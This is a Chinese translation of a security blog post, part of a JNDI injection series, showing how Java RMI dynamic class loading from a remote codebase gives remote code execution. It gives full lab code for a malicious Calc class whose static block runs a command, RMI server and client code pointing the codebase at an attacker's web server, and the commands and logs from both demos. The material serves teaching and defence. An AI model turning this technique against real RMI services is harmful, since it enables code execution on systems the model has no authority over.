<html>
<head>
<title>JNDI Injection Series: RMI Vector - Dynamic Class Loading From Remote URL</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">JNDI注入系列:RMI向量——从远程URL动态加载类</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/jndi-injection-series-rmi-vector-dynamic-class-loading-from-remote-url-28dcbf9cee27?source=collection_archive---------4-----------------------#2022-12-29">https://infosecwriteups.com/jndi-injection-series-rmi-vector-dynamic-class-loading-from-remote-url-28dcbf9cee27?source=collection_archive---------4-----------------------#2022-12-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/d82eb36eda652b6844a34574d08f33dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*MlzU05jcqu24Adte"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://unsplash.com/photos/zxLFkqDtG08" rel="noopener ugc nofollow" target="_blank">https://unsplash.com/photos/zxLFkqDtG08</a></figcaption></figure><p id="42dd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们已经在<a class="ae kc" href="https://medium.com/bugbountywriteup/jndi-injection-series-rmi-vector-1-31044f782daa" rel="noopener">的前一篇博客</a>中介绍了RMI系统的基本原理。在这篇博客中，我们将继续讨论如何利用RMI通过动态类加载获得RCE。</p><h1 id="6879" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">RMI中的动态类加载</h1><p id="9ec9" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">Java RMI是一种机制，它允许存在于一个Java虚拟机(RMI客户机)中的对象调用在另一个Java虚拟机(RMI服务器)中定义的方法。当RMI调用中传递的参数、返回值或异常是一个对象时，RMI系统使用对象序列化将数据从一台机器传输到另一台机器。接收程序解组远程方法调用的参数和返回值，它们成为活动对象。在反序列化过程中，流中的这些传输对象需要类定义。如果它们是标准对象，那么这些类将被本地加载，因为它们在每个JVM中都是可用的。但是如果类不能在接收程序上本地解析，RMI提供了一个工具，用于从发送端点指定的网络位置动态加载类定义。</p><p id="e37f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">下图描述了RMI系统，该系统使用RMI registry获取对远程对象的引用，并在需要时使用现有的Web服务器在解组上述场景中传输的对象时加载类字节码。可以是RMI客户机或RMI服务器下载类定义。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi me"><img src="../Images/cb7326c627374b83a5330f66211a5a6d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9kFvy7wDDkB8tU2mvgr5sw.png"/></div></div></figure><p id="bee0" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果在接收方的JVM中没有找到类定义，RMI允许接收方下载对象类的定义。一个对象的所有类型和行为，以前只能在单个JVM中使用，现在可以传输到远程接收方的JVM。这种能力动态地扩展了应用程序的行为，但同时，如果类定义文件被对手控制，就会引入危险的攻击媒介。任意的类被类加载器解释到JVM中，这意味着字节码——不管有多恶意——将在您的系统中被解释。接收者的服务器将成为RCE的牺牲品。</p><p id="952d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有两个例子来展示RMI客户机如何攻击RMI服务器，以及RMI服务器如何利用RMI系统的动态类加载特性来攻击RMI客户机。</p><p id="a2cd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这两个例子为RMI服务器和RMI客户机使用了在上一篇博客的<a class="ae kc" href="https://medium.com/bugbountywriteup/jndi-injection-series-rmi-vector-1-31044f782daa" rel="noopener">2.1节中设置的相同环境。</a></p><h1 id="e0e5" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">演示1攻击RMI客户端</h1><p id="2ce1" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">在本演示中，有两台服务器，一台是IP为192.168.0.96的RMI客户端，另一台是IP为192.168.0.95的RMI服务器。为恶意Calc.class提供服务的python web服务器在RMI服务器上运行。为了攻击RMI客户端，RMI服务器将python web服务器配置为代码库，并使用Calc对象作为RMI客户端调用的方法的返回值。由于Calc对象只存在于RMI服务器指定的代码库中，所以RMI客户机在获得Calc对象作为返回值后，可以下载Calc.class来解析Calc类的定义。植入Calc.class的恶意命令一旦被RMI客户端JVM解释，就会被执行。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mj"><img src="../Images/d4c8e5693ac076ae8e8fea3fa4ef0cbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j22nWnZTEwV5VQemjK_JMw.png"/></div></div></figure><h1 id="4c42" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">2.1设置RMI服务器</h1><p id="35a2" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated"><strong class="kf ir">定义远程接口</strong></p><p id="30c8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">正如在<a class="ae kc" href="https://medium.com/bugbountywriteup/jndi-injection-series-rmi-vector-1-31044f782daa" rel="noopener">之前的博客</a>中提到的，RMI应用程序应该从扩展RMI定义的远程接口的远程接口开始。可以远程调用的远程对象的方法必须在接口中指定。接口中的每个方法都必须声明为抛出RemoteException，以解决远程方法调用期间的错误。</p><p id="c15e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这个演示中，服务接口是在Services.java定义的。</p><p id="e846" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Services.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="2b95" class="mp lc iq ml b be mq mr l ms mt">package rmi.api;<br/>import java.rmi.RemoteException;<br/>​<br/>public interface Services extends java.rmi.Remote {<br/>    Object sendMessage(String msg) throws RemoteException;<br/>}</span></pre><p id="c20c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">同一个接口是服务器和客户机应用程序的一部分，充当它们之间通信的契约。</p><p id="6812" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">开发实现类</strong></p><p id="b8af" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">远程接口提供了特定远程对象的所有方法的描述，接下来的事情是创建该接口的实现，并提供该接口的所有抽象方法的实现。</p><p id="fa49" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ServicesImpl.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="a300" class="mp lc iq ml b be mq mr l ms mt">package rmi.api.imp;<br/>import rmi.remoteclass.Calc;<br/>import java.rmi.RemoteException;<br/>import rmi.api.Services;<br/>​<br/>public class ServicesImpl implements Services {<br/>    @Override<br/>    public Calc sendMessage(String msg) throws RemoteException {<br/>        return new Calc();<br/>    }<br/>}</span></pre><p id="82b7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Calc类是在RMI服务器上定义的恶意类，Calc对象是RMI客户端将调用的sendMessage方法的返回值。在Calc.class内部，有一个包含任意命令的静态块。当Calc.class加载到RMI客户机JVM中时，静态块将被触发。</p><p id="b994" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Calc.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="b9c6" class="mp lc iq ml b be mq mr l ms mt">package rmi.remoteclass;<br/>import java.lang.Runtime;<br/>import java.lang.Process;<br/>import javax.naming.Context;<br/>import javax.naming.Name;<br/>import javax.naming.spi.ObjectFactory;<br/>import java.util.Hashtable;<br/>import java.io.Serializable;<br/>​<br/>public class Calc implements ObjectFactory, Serializable {<br/>    private static final long serialVersionUID = 4474289574195395731L;<br/>​<br/>    static {<br/>        try {<br/>            Runtime rt = Runtime.getRuntime();<br/>            // it will get executed on the RMI client <br/>            String[] commands = {"touch", "/tmp/Calc1"};<br/>            Process pc = rt.exec(commands);<br/>            pc.waitFor();<br/>        } catch (Exception e) {<br/>            // do nothing<br/>        }<br/>    }<br/>​<br/>    @Override<br/>    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)  throws Exception {<br/>        try {<br/>            // it will not get executed during the exp<br/>            System.out.println("Enter getObjectInstance");<br/>        } catch (Exception e) {<br/>            // do nothing<br/>        }<br/>        return null;<br/>    }<br/>}</span></pre><p id="d07f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">创建RMI服务器类</strong></p><p id="a6d3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">RmiServer.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="52df" class="mp lc iq ml b be mq mr l ms mt">package rmi.server;<br/>​<br/>import java.rmi.AlreadyBoundException;<br/>import java.rmi.RemoteException;<br/>import java.rmi.registry.LocateRegistry;<br/>import java.rmi.registry.Registry;<br/>import java.rmi.server.UnicastRemoteObject;<br/>import rmi.api.imp.ServicesImpl;<br/>import rmi.api.Services;<br/>​<br/>public class RmiServer {<br/>    public static void main(String[] args) {<br/>        try {<br/>            ServicesImpl obj = new ServicesImpl();<br/>            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);<br/>            System.setProperty("java.rmi.server.codebase", "http://192.168.0.95:8000/");<br/>​<br/>            Registry reg;<br/>            try {      <br/>                reg = LocateRegistry.createRegistry(9999);<br/>                System.out.println("java RMI registry created. port on 9999...");<br/>            } catch (Exception e) {<br/>                System.out.println("Using existing registry");<br/>                reg = LocateRegistry.getRegistry();<br/>            }            <br/>            reg.bind("Services", services);<br/>        } catch (RemoteException e) {<br/>            e.printStackTrace();<br/>        } catch (AlreadyBoundException e) {<br/>            e.printStackTrace();<br/>        }<br/>    }<br/>}<br/>​</span></pre><p id="59f9" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">192.168.0.95是RMI服务器的IP，当RMI服务器将代码库设置为192.168.0.95时，它还用于托管python web服务器以提供Calc.class文件，并且您可以根据需要将其配置为另一个服务器IP。</p><p id="b9da" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">编译代码</strong></p><p id="76d1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">上述源代码文件存储在以下文件夹结构中，供您参考。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/33fb00dfa5a684e9996eac56dcb1762e.png" data-original-src="https://miro.medium.com/v2/resize:fit:440/format:webp/1*upCcHw2NPifVlHt85j699Q.png"/></div></figure><p id="f422" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">编译Calc.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="5265" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-server]# javac rmi/remoteclass/Calc.java</span></pre><p id="5658" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在rmi-server文件夹下设置简单的http服务器来服务Calc.class</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="0d8a" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-server]# python3 -m http.server 8000<br/>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre><p id="6e90" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">编译RMI服务器并启动它</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="9feb" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-server]# javac rmi/server/RmiServer.java <br/>[root@demo rmi-server]# java rmi/server/RmiServer<br/>java RMI registry created. port on 9999...</span></pre><h1 id="45d6" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">2.2建立一个RMI客户端</h1><p id="af34" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">您已经准备好了RMI服务器，现在是RMI客户端的时候了。在客户机服务器上，这更简单，您只需要定义与RMI服务器上相同的远程接口，并创建RMI客户机类。</p><p id="c57b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">定义远程接口</strong></p><p id="31f8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Services.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="d2c2" class="mp lc iq ml b be mq mr l ms mt">package rmi.api;<br/>import java.rmi.RemoteException;<br/>​<br/>public interface Services extends java.rmi.Remote {<br/>    Object sendMessage(String msg) throws RemoteException;<br/>}</span></pre><p id="d9bc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">该接口应该在RMI服务器中指定的同一个包中，否则当RMI客户端试图调用远程服务器对象上的方法时，您将遇到一些错误“没有安全管理器:RMI类加载器被禁用”。</p><p id="bdb4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">创建RMI客户端</strong></p><p id="d280" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">RmiClient.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="8ecc" class="mp lc iq ml b be mq mr l ms mt">//RMIClient1.java<br/>package rmi.client;<br/>​<br/>import java.rmi.RMISecurityManager;<br/>import java.rmi.registry.LocateRegistry;<br/>import java.rmi.registry.Registry;<br/>import rmi.api.Services;<br/>​<br/>public class RmiClient {<br/>​<br/>    public static void main(String[] args) throws Exception {<br/>        String host = "localhost";<br/>        if (args.length &gt; 0)<br/>            host = args[0];<br/>​<br/>        System.setProperty("java.security.policy", RmiClient.class.getClassLoader().getResource("resources/java.policy").getFile());<br/>        RMISecurityManager securityManager = new RMISecurityManager();<br/>        System.setSecurityManager(securityManager);<br/>​<br/>        Registry registry = LocateRegistry.getRegistry(host, 9999);<br/>        Services services = (Services) registry.lookup("Services");<br/>        services.sendMessage("hello");<br/>    }<br/>}</span></pre><p id="0607" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">上述源代码文件存储在以下文件夹结构中，供您参考。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/61d1d174fca6319d38cd69434b7145a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:434/format:webp/1*XlOJEV6QlaHvHSjPopCIvQ.png"/></div></figure><p id="0bfb" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在RMI客户机上，编译java文件并在rmi-client目录下执行它。因为您已经将RMI服务器和客户机放在不同的服务器上，所以当运行RMI客户机时，RMI服务器的IP(在本演示中，192.168.0.95是RMI服务器的IP)应该作为RMI客户机的一个参数。</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="4d81" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-client]# javac rmi/client/RmiClient.java <br/>[root@demo rmi-client]# java rmi/client/RmiClient 192.168.0.95<br/>[root@demo rmi-client]#</span></pre><p id="1e95" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在RMI服务器端，记录了Calc.class是由IP地址为192.168.0.96的RMI客户端从web服务器下载的:</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="599c" class="mp lc iq ml b be mq mr l ms mt">[root@demo ~]# python3 -m http.server 8000<br/>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br/>192.168.0.96 - - [25/Dec/2022 21:35:55] "GET /rmi/remoteclass/Calc.class HTTP/1.1" 200 -</span></pre><p id="0f60" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">检查RMI客户端服务器上的/tmp/ folder，你会发现Calc1文件，这意味着Calc类的静态块内的<code class="fe mw mx my ml b">String[] commands = {"touch", "/tmp/Calc1"};</code>得到执行。</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="02b7" class="mp lc iq ml b be mq mr l ms mt">[root@demo ~]# ls /tmp/<br/>Calc1</span></pre><h1 id="324e" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">演示2攻击RMI服务器</h1><p id="af2e" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">仍然使用两个与上一个演示相同的服务器(一个是具有IP 192.168.0.96的RMI客户端，另一个是具有IP 192.168.0.95的RMI服务器)，但是本演示在这两个服务器之间切换了攻击者和受害者角色。</p><p id="add6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这一次，一个服务于恶意Calc.class的web服务器在RMI客户机服务器上运行。为了攻击RMI服务器，RMI客户端将web服务器配置为代码库，并使用Calc对象作为远程调用方法的参数。由于Calc对象只存在于RMI客户机指定的代码库中，所以RMI服务器在获得Calc对象作为被调用方法的输入参数后，将下载Calc.class来解析Calc类的定义。嵌入在Calc类中的恶意命令一旦被RMI服务器JVM解释就会被执行。</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/555011af0dec2d47aa1beaa5dfccf288.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jLRgHuxRjILRo3T8LLZaVg.png"/></div></div></figure><p id="d24e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了简洁起见，这里只显示RMI服务器和RMI客户机类的代码。完整的源代码可以从博文末尾的github下载。</p><p id="dc52" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">RMI服务器的java文件:</p><p id="d824" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">RmiServer.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="a729" class="mp lc iq ml b be mq mr l ms mt">package rmi.server;<br/>​<br/>import java.rmi.RMISecurityManager;<br/>import java.rmi.AlreadyBoundException;<br/>import java.rmi.RemoteException;<br/>import java.rmi.registry.LocateRegistry;<br/>import java.rmi.registry.Registry;<br/>import java.rmi.server.UnicastRemoteObject;<br/>import rmi.api.imp.ServicesImpl;<br/>import rmi.api.Services;<br/>​<br/>public class RmiServer {<br/>    public static void main(String[] args) {<br/>        try {<br/>            ServicesImpl obj = new ServicesImpl();<br/>            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);<br/>            Registry reg;<br/>​<br/>            try {<br/>                System.setProperty("java.security.policy", RmiServer.class.getClassLoader().getResource("resources/java.policy").getFile());<br/>                RMISecurityManager securityManager = new RMISecurityManager();<br/>                System.setSecurityManager(securityManager); <br/>​<br/>                reg = LocateRegistry.createRegistry(9999);<br/>                System.out.println("java RMI registry created. port on 9999...");<br/>            } catch (Exception e) {<br/>                System.out.println("Using existing registry");<br/>                reg = LocateRegistry.getRegistry();<br/>            }<br/>            <br/>            reg.bind("Services", services);<br/>​<br/>        } catch (RemoteException e) {<br/>            e.printStackTrace();<br/>        } catch (AlreadyBoundException e) {<br/>            e.printStackTrace();<br/>        }<br/>    }<br/>}</span></pre><p id="8190" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">编译启动RMI服务器的代码。</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="7588" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-server]# javac rmi/server/RmiServer.java <br/>[root@demo rmi-server]# java rmi/server/RmiServer<br/>java RMI registry created. port on 9999...</span></pre><p id="d68b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">RMI客户端类定义如下:</p><p id="bd75" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">RmiClient.java</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="c835" class="mp lc iq ml b be mq mr l ms mt">//RMIClient1.java<br/>package rmi.client;<br/>​<br/>import java.rmi.registry.LocateRegistry;<br/>import java.rmi.registry.Registry;<br/>import rmi.api.Services;<br/>import rmi.remoteclass.Calc;<br/>​<br/>public class RmiClient {<br/>    public static void main(String[] args) throws Exception {<br/>        String host = "localhost";<br/>        if (args.length &gt; 0)<br/>            host = args[0];<br/>​<br/>        System.setProperty("java.rmi.server.codebase", "http://192.168.0.96:8000/");<br/>        Registry registry = LocateRegistry.getRegistry(host, 9999);<br/>        Services services = (Services) registry.lookup("Services");<br/>        Calc calc = new Calc();<br/>        services.sendMessage(calc);<br/>    }<br/>}</span></pre><p id="4659" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">RMI服务器上定义的sendMessage方法接受Message对象作为参数，但是为了攻击RMI服务器，RMI客户机提供了一个Calc对象作为sendMessage方法的参数。</p><p id="7d0a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在客户端，启动一个简单的web服务器来托管Calc.class文件。</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="0aef" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-client]# python3 -m http.server 8000<br/>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre><p id="b0d4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">编译计算代码</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="7786" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-client]# javac rmi/remoteclass/Calc.java</span></pre><p id="c856" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">编译RMI客户端代码，并启动它，192.168.0.95是RMI服务器的IP。</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="b79a" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-client]# javac rmi/client/RmiClient.java <br/>[root@demo rmi-client]# java rmi/client/RmiClient 192.168.0.95<br/>[root@demo rmi-client]#</span></pre><p id="b11f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在RMI客户机被执行之后，从web服务器的控制台，观察到RMI服务器(192.168.0.95)从web服务器下载恶意的Calc.class。</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="77a6" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-client]#  python3 -m http.server 8000<br/>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br/>192.168.0.95 - - [25/Dec/2022 22:55:13] "GET /rmi/remoteclass/Calc.class HTTP/1.1" 200 -</span></pre><p id="cde6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">检查RMI服务器Linux上的tmp文件夹，Calc1文件是Calc.class中的嵌入式命令在RMI服务器上执行的结果。</p><pre class="mf mg mh mi gt mk ml mm bn mn mo bi"><span id="dc58" class="mp lc iq ml b be mq mr l ms mt">[root@demo rmi-server]# ls /tmp/<br/>Calc1</span></pre><p id="01d1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">以上两个演示的源代码可以在<a class="ae kc" href="https://github.com/zer0-map/JNDI-Injection-Series/tree/main/RMIVector/rmi-DynamicObjectLoading-attackingClient" rel="noopener ugc nofollow" target="_blank">攻击RMI客户端</a>和<a class="ae kc" href="https://github.com/zer0-map/JNDI-Injection-Series/tree/main/RMIVector/rmi-DynamicObjectLoading-attackingServer" rel="noopener ugc nofollow" target="_blank">攻击RMI服务器</a>找到。</p><p id="1643" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">事实上，从远程源加载动态类存在限制和过滤机制，攻击者从未停止发展和采用新技术来绕过这些限制，您将在本系列的下一篇博文中看到一些利用示例。</p><p id="761f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在下一篇博文中，我们将学习如何使用<a class="ae kc" href="https://medium.com/@yany.dong/jndi-injection-series-rmi-vector-insecure-deserialization-9b7a4b524d1d" rel="noopener">不安全的反序列化来攻击RMI服务</a>。</p><p id="8004" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">参考:</p><p id="e328" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">https://paper.seebug.org/1091/</p><h1 id="0a88" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最后的想法</h1><p id="0fcb" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">如果您有任何问题或反馈，请随时发表评论。如果你认为这篇博文有帮助，请点击拍手👏按钮下面几下，以示支持！</p></div><div class="ab cl na nb hu nc" role="separator"><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf"/></div><div class="ij ik il im in"><h2 id="581a" class="nh lc iq bd ld ni nj dn lh nk nl dp ll ko nm nn lp ks no np lt kw nq nr lx ns bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>